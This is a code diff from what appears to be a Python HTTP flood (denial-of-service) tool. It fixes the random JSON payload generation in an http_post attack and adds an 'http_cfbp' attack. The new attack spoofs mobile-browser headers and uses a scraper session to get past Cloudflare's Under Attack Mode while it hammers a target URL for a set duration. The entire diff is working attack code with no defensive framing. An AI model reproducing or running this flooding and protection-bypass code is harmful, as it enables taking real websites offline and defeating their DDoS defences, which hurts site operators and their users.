@@ -51,10 +51,11 @@ def http_post(worker_id, session, target_url, attack_duration, useragent=None, r
             headers = buildheaders(target_url, useragent, referer)
 
             payload_choice = randint(0,2)
+            data = randstr(randint(10,20))
             if payload_choice == 1: # json payload
                 json_data = {}
                 for _ in range(10):
-                    if randint(0,1) == 1: json_data.update({randstr(randint(5, 20)): randstr(40, 60)})
+                    if randint(0,1) == 1: json_data.update({randstr(randint(5, 20)): randstr(randint(40, 60))})
                     else: json_data.update({randstr(randint(5, 20)): {choice(keywords): choice(keywords)}})
 
                 data = json.dumps(json_data)               
@@ -205,6 +206,45 @@ def http_mix(worker_id, session, target_url, attack_duration, useragent=None, re
         except Exception:
             Core.infodict[worker_id]['req_fail'] += 1
         Core.infodict[worker_id]['req_total'] += 1
+    Core.threadcount -= 1
+
+def http_cfbp(worker_id, scraper, target_url, attack_duration, useragent=None, referer=None):
+    '''
+    Attack which tries to bypass Cloudflare's UAM (Under Attack Mode)
+    '''
+
+    if target_url is None:
+        return False
+
+    time.sleep(5)
+
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+        'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
+        'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
+        'Cache-Control': 'no-cache',
+        'Pragma': 'no-cache',
+        'Connection': 'keep-alive',
+        'Upgrade-Insecure-Requests': '1',
+        'Sec-Fetch-Dest': 'document',
+        'Sec-Fetch-Mode': 'navigate',
+        'Sec-Fetch-Site': 'same-origin',
+        'Sec-Fetch-User': '?1',
+        'TE': 'trailers',
+    }
+
+    stoptime = time.time() + attack_duration
+    while time.time() < stoptime and Core.attackrunning:
+        try:
+            scraper.get(url=target_url, headers=headers, timeout=2, allow_redirects=False)
+
+            Core.infodict[worker_id]['req_sent'] += 1
+        except Exception as e:
+            print(str(e).rstrip())
+            Core.infodict[worker_id]['req_fail'] += 1
+        Core.infodict[worker_id]['req_total'] += 1
+
     Core.threadcount -= 1
 
 '''
